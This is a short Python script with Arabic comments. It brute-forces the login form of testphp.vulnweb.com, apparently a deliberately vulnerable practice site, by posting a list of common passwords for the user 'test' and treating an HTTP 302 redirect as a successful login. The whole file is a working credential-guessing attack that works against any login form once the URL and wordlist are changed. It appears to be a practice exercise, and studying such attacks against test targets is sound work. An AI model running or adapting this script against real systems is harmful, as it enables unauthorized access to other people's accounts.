import requests

url = "http://testphp.vulnweb.com/login.php"
username = "test"
passwords = ["1234", "test", "password", "admin", "123456"]

for pwd in passwords:
    data = {"uname": username, "pass": pwd}
    r = requests.post(url, data=data, allow_redirects=False)

    print(f"Trying: {pwd}")

    # هنا هنستخدم الـ status code
    if r.status_code == 302:  # الموقع هيعمل Redirect لو الدخول صحيح
        print(f"✅ كلمة السر الصحيحة: {pwd}")
    else:
        print("❌ غلط")
